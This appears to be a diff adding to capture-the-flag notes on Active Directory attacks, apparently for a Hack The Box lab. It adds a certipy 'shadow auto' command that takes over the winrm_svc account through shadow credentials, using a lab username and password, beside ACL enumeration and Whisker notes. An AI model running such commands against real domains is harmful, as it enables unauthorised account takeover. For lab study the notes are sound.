@@ -16,6 +16,10 @@ Get-DomainObjectAcl | Where-Object {
 
 Get-DomainObjectAcl  | Where-Object { $_.ObjectAceType -eq "5b47d60f-6051-40fb-99e0-ed3a78604e5d" }
 ```
+# Certipy-ad
+```powershell
+certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.10.11.69
+```
 
 # Whisker.exe
 ```powershell
